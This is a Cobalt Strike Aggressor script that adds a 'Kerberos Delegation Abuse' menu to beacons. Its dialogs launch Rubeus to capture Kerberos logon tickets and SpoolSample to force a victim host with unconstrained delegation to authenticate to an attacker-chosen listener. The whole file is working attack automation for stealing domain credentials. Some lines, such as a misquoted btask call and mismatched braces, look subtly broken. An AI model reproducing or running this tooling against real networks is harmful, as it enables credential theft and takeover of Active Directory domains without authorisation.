popup beacon_top {

menu "Kerberos Delegation Abuse"{

item "Monitor Tickets"{

			local('$bid');
				foreach $bid ($1){
					monitor_tickets($bid);
					abuse_spooler($bid);
				}


}

sub monitor_tickets{
    $bid = $1;
    $dialog = dialog("Monitor Specific Logons", %(interval => "", filteruser => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
		$cmdargs = "monitor /interval:$3['interval'] /filteruser:$3['filteruser']";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Begin Monitoring for logons');
            bexecute_assembly($bid, script_resource('../../opt/cobalt_strike_extension_kit/exe/Rubeus.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "This will help automate the process of abusing unconstrained delegation - 5 is a good interval FWIW");
    drow_text($dialog, "interval",  "Rubeus interval between logon checks");
    drow_text($dialog, "filteruser",  "Computer to specify logons");
    dbutton_action($dialog, "Run");
	dialog_show($dialog);
}


sub abuse_spooler{
	$bid = $1;
	$dialog = dialog("Abuse Spooler Bug", %(victim => "", listener => "", execmethod => "Execute-Assembly"), lambda({
		$cmdargs = "";
		$cmdargs = "$3['victim'] $3['listener']";
		if ($3["execmethod"] eq "Execute-Assembly"){
		btask("$bid, 'Let's Hope for a ticket!!'");
		bexecute_assembly($bid, script_resource('../../opt/cobalt_strike_extension_kit/exe/SpoolSample.exe'), $cmdargs);
		}
	}));
	dialog_description($dialog, "Now we need to Specify a Victim Machine with Unconstrained Delegation and a Listener to collect the ticket");
	drow_text($dialog, "victim",  "Victim with Unconstrained Delegation");
    drow_text($dialog, "listener",  "Machine to catch ticket");
    dbutton_action($dialog, "Run");
    dialog_show($dialog);
    
		}
	}
}
